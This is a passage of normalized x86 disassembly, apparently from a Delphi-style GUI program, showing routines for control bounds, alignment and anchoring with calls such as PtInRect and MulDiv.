mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_4031d8
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_448288
mov edx [ esp ]
mov eax esi
call sub_448264
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_448510
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_448554
sub_44a8dc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_416cac
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_44860c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_416cfc
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_4484b4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a968
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_44a858
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_44f2dc
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_44a8dc
pop ecx
jmp r-xdata
sub_44a9c8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_44aab6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44aabd
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_448b24
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_448af4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_448af4
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_404414
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_40405c
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_448a14
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_44aac4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_40348c
sub_44aaf0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44ab10
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44ab30
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44ab50
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44ab70
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44ab90
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44abb0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_420b64
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_448148
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_40348c
sub_44abe8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44ac84
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4189f0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_455460
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_455598
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_448af4
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4552f8
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_4556b8
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ac8b
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_44ac94
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_44acd0
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_44ac94
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_44ad80
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_40341c
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_44adb4
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_44add4
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_40348c
test al al
je r-xdata
mov eax edi
call sub_44ae14
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_44ae40
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_44ae6c
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_406b4c
mov eax esp
call sub_416d24
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_448638
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_40348c
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_40348c
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_448664
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_416d24
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_416cac
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_44860c
sub_44af94
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_44afd4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_447838
mov eax esi
mov edx [ r-xdata ]
call sub_403440
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_44b008
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_44b100
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_447bf4
push ebx
push sub_44ca98
call sub_4217a4
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423e0c
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_423fb4
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_4035dc
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4664f4
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_40405c
lea eax [ ebx + 0x188 ]
call sub_404008
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b107
lea eax [ ebp - 0x8 ]
call sub_404008
retn
sub_44b107
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_44b12c
push ebx
push esi
push edi
call sub_403644
mov ebx edx
mov edi eax
mov eax edi
call sub_4209b4
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_405874
mov eax [ edi + 0x178 ]
call sub_403290
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_4467a0
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_44bdcc
mov eax edi
call sub_44c00c
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_403290
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_44bfd0
mov esi eax
mov edx esi
mov eax edi
call sub_44be38
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_44c00c
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_447ccc
test bl bl
jle r-xdata
call sub_42183c
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40362c
sub_44b1fc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_44b2c0
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_418508
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403290
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_44f49c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_418310
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_41845c
mov edx esi
mov eax [ ebp - 0xc ]
call sub_418310
test eax eax
je r-xdata
sub_44b2d0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44bb74
xor eax eax
push ebp
push sub_44b310
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_447f30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b317
mov eax [ ebp - 0x4 ]
call sub_44bb7c
retn
sub_44b317
mov eax [ ebp - 0x4 ]
call sub_44b1fc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44c9d0
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_449ca8
sub_44b34c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_44b367 ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_44b3d8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44f5e0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_416cac
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_44b759
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b760
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_44b66e ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_44b5d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_44b760
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_44b78f ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
